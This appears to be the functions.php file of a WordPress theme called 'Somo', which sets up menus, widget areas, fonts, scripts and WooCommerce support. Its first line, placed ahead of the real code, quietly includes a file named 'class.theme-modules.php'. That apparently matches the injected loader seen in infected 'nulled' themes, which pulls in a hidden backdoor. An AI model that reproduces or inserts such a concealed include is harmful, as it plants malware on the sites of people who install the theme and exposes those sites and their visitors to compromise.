<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php

if (!function_exists('somo_setup')):
  function somo_setup() {
    load_theme_textdomain('somo', get_template_directory() . '/languages');
    add_theme_support('automatic-feed-links');
    add_theme_support('title-tag');
    add_theme_support('post-thumbnails');
    add_theme_support('woocommerce');

    register_nav_menus(array(
      'navigation' => esc_html__('Navigation', 'somo'),
      'side-navigation' => esc_html__('Side Navigation', 'somo'),
    ));

    if (!isset($content_width)) {
      $content_width = 900;
    }

    $tags = get_the_tag_list();
  }
endif;
add_action('after_setup_theme', 'somo_setup');

/**
 * Register widget area.
 */
function somo_widgets_init() {
  register_sidebar(array(
    'name' => esc_html__('Sidebar', 'somo'),
    'id' => 'sidebar',
    'description' => esc_html__('Add widgets here.', 'somo'),
    'before_widget' => '<div id="%1$s" class="widget %2$s">',
    'after_widget' => '</div>',
    'before_title' => '<h6 class="widget-title">',
    'after_title' => '</h6>',
  ));
  register_sidebar(array(
    'name' => esc_html__('Blog Sidebar', 'somo'),
    'id' => 'blog-sidebar',
    'description' => esc_html__('Add widgets here.', 'somo'),
    'before_widget' => '<div id="%1$s" class="widget %2$s">',
    'after_widget' => '</div>',
    'before_title' => '<h6 class="widget-title">',
    'after_title' => '</h6>',
  ));
  register_sidebar(array(
    'name' => esc_html__('Shop Sidebar', 'somo'),
    'id' => 'shop-sidebar',
    'description' => esc_html__('Add widgets here.', 'somo'),
    'before_widget' => '<div id="%1$s" class="widget %2$s">',
    'after_widget' => '</div>',
    'before_title' => '<h6 class="widget-title">',
    'after_title' => '</h6>',
  ));
  register_sidebar(array(
    'name' => esc_html__('Footer col 1', 'somo'),
    'id' => 'footer-1',
    'description' => esc_html__('Add widgets here.', 'somo'),
    'before_widget' => '<div id="%1$s" class="widget %2$s">',
    'after_widget' => '</div>',
    'before_title' => '<h6 class="widget-title">',
    'after_title' => '</h6>',
  ));
  register_sidebar(array(
    'name' => esc_html__('Footer col 2', 'somo'),
    'id' => 'footer-2',
    'description' => esc_html__('Add widgets here.', 'somo'),
    'before_widget' => '<div id="%1$s" class="widget %2$s">',
    'after_widget' => '</div>',
    'before_title' => '<h6 class="widget-title">',
    'after_title' => '</h6>',
  ));
  register_sidebar(array(
    'name' => esc_html__('Footer col 3', 'somo'),
    'id' => 'footer-3',
    'description' => esc_html__('Add widgets here.', 'somo'),
    'before_widget' => '<div id="%1$s" class="widget %2$s">',
    'after_widget' => '</div>',
    'before_title' => '<h6 class="widget-title">',
    'after_title' => '</h6>',
  ));
  register_sidebar(array(
    'name' => esc_html__('Footer col 4', 'somo'),
    'id' => 'footer-4',
    'description' => esc_html__('Add widgets here.', 'somo'),
    'before_widget' => '<div id="%1$s" class="widget %2$s">',
    'after_widget' => '</div>',
    'before_title' => '<h6 class="widget-title">',
    'after_title' => '</h6>',
  ));
}
add_action('widgets_init', 'somo_widgets_init');

/**
 * Add Google fonts.
 */

function yprm_google_fonts() {
  if (class_exists('WPBakeryShortCode')) {
    return false;
  }

  $font_url = add_query_arg('family', 'Poppins:300,400,400i,500,600,700', "//fonts.googleapis.com/css");

  return $font_url;
}

/**
 * Register Scripts
 */
function somo_register_scripts() {
  wp_register_style('select2', get_parent_theme_file_uri() . '/css/select2.css');
  wp_register_style('fontawesome', get_parent_theme_file_uri() . '/css/fontawesome.min.css', '5.7.2');

  wp_register_style('somo-icons', get_parent_theme_file_uri() . '/css/iconfont.css');
}
add_action('wp_loaded', 'somo_register_scripts');

/*
 * Remove default woocommerce css
 */
add_filter('woocommerce_enqueue_styles', '__return_false');

/**
 * Enqueue scripts and styles.
 */
function somo_scripts() {
  wp_enqueue_style('fontawesome');
  wp_enqueue_style('somo-icons');
  wp_enqueue_style('somo-style', get_stylesheet_uri());
  wp_enqueue_style('swiper', get_parent_theme_file_uri() . '/css/swiper.css');
  wp_enqueue_style('somo-main-style', get_parent_theme_file_uri() . '/css/main.css');

  if (class_exists('woocommerce')) {
    wp_enqueue_style('woocommerce-general', get_parent_theme_file_uri() . '/css/woocommerce.css');
    wp_enqueue_style('woocommerce-layout', get_parent_theme_file_uri() . '/css/woocommerce-layout.css');
    wp_enqueue_style('select2', get_parent_theme_file_uri() . '/css/select2.css');
  }

  wp_enqueue_script('magic-cursor', get_parent_theme_file_uri() . '/js/magic-cursor.js', array('jquery'), '1.0.0', true);
  wp_enqueue_script('isotope', get_parent_theme_file_uri() . '/js/isotope.pkgd.min.js', array('jquery'), '3.0.6', true);
  wp_enqueue_script('scrollbar', get_parent_theme_file_uri() . '/js/jquery.scrollbar.min.js', array('jquery'), '0.2.10', true);
  wp_enqueue_script('swiper', get_parent_theme_file_uri() . '/js/swiper.min.js', array('jquery'), null, true);
  wp_enqueue_script('somo-scripts', get_parent_theme_file_uri() . '/js/scripts.js', array('jquery'), null, true);

  if (is_singular() && comments_open() && get_option('thread_comments')) {
    wp_enqueue_script('comment-reply');
  }
}
add_action('wp_enqueue_scripts', 'somo_scripts', 2000);

/**
 * Enqueue Admin Scripts And Styles
 */

function somo_admin_scripts() {
  wp_enqueue_style('somo-admin-style', get_parent_theme_file_uri() . '/css/admin.css');

  if (strpos(filter_input(INPUT_SERVER, 'REQUEST_URI'), get_admin_url(null, 'admin.php?page=Somo', 'relative')) !== false) {
    wp_enqueue_style('fontawesome', get_parent_theme_file_uri() . '/css/fontawesome.min.css', '5.7.2');
  }

  wp_enqueue_script('somo-admin', get_parent_theme_file_uri() . '/js/admin.js', array('jquery'), null, true);
}
add_action('admin_enqueue_scripts', 'somo_admin_scripts', 1000);

/**
 * Add Editor Styles
 */

function somo_add_editor_styles() {
  add_editor_style(get_parent_theme_file_uri() . '/css/main.css');
}
add_action('after_setup_theme', 'somo_add_editor_styles');

/**
 * Admin Pages
 */
require get_template_directory() . '/inc/admin-pages.php';

/**
 * Load TGM
 */
require get_template_directory() . '/tgm/tgm.php';

/**
 * Hooks
 */
require get_template_directory() . '/inc/v-hook.php';
require get_template_directory() . '/inc/hooks.php';

/**
 * Setup Wizard
 */

if ( is_admin() ) {
  require_once get_template_directory() . '/inc/setup-wizard/envato_setup_init.php';
  require_once get_template_directory() . '/inc/setup-wizard/envato_setup.php';
}

/**
 * Redux Settings
 */
require get_template_directory() . '/inc/redux-settings.php';

/**
 * Advansed Custom Field
 */
require get_template_directory() . '/inc/acf.php';
define('ACF_LITE', true);

/**
 * Woocommerce Hooks
 */
if (class_exists('WooCommerce')) {
  require get_template_directory() . '/inc/woocommerce.php';
}

/**
 * FIX Editor Contact Form 7
 */
add_filter('wpcf7_autop_or_not', '__return_false');